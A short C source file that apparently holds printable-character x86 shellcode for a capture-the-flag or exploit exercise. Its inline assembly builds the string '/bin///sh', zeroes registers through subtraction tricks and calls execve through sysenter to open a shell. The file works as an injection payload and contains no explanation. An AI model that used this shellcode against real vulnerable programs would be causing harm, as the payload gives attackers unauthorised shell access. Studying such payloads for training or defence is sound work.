#include <unistd.h>

void getShell()
{
	/* (0x1f, 0x7f) */
	__asm__("push 0x68;"
			"push 0x732f2f2f;"
			"push 0x6e69622f;"

			/* set ebx -> /bin///sh */
			"push esp;"
			"pop ebx;"

			"push 0x44;"
			"pop ecx;"
			"sub cl, 0x44;"

			"push 0x44;"
			"pop edx;"
			"sub dl, 0x44;"

			/* set eax = 11 */
			"push 0x7e7e7e7e;"
			"pop eax;"
			"sub eax, 0x7e7e7e73;"

			/* syscall */
			"sysenter;"
		   );
}

int main()
{
	getShell();
	return 0;
}
